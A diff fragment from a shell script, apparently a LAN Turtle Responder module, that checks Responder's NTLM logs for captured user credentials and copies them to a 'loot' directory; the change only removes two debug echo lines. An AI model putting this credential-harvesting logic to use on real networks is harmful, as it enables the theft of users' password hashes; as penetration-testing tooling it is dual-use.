@@ -126,10 +126,8 @@ while true; do
 # Grep for user creds and do not match on machine creds, machine usernames end in $
 if [ $(grep -v '\$:' /sd/turtle/Responder/logs/*NTLM* 2>/dev/null) ];
   then 
-  echo "First if done" >> /root/loot/responder.log
     if [[ ! $(cat /root/loot/responder.log | tail -n1) == *"Creds"* ]]
     then
-      echo "Creds saved! *Second if done*" >> /root/loot/responder.log
 #copy all responder logs to loot directory      
       cp /sd/turtle/Responder/logs/* /root/loot/$((dircount))
       finished
